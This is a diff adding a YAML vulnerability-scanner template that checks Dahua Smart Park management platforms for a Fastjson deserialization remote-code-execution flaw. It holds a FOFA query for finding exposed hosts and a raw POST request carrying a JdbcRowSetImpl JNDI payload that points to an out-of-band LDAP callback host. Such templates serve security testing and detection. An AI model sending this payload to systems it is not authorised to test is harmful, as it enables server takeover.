@@ -1,0 +1,28 @@
+id: dahua-smart-park-ipms-rce
+
+info:
+  name: 大华智慧园区综合管理平台 ipms 远程代码执行
+  author: HuanXiong
+  severity: critical
+  description: |
+    fofa-query: app="dahua-智慧园区综合管理平台"
+    大华园区综合管理平台 deleteFtp 接口处存在Fastjson反序列化漏洞 恶意攻击者可能会执行恶意代码，造成服务器失陷
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        POST /ipms/barpay/pay HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/json
+        Accept-Encoding: gzip
+        Connection: close
+        
+        {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://{{interactsh-url}}", "autoCommit": true}
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(interactsh_protocol, "dns")
+        condition: and
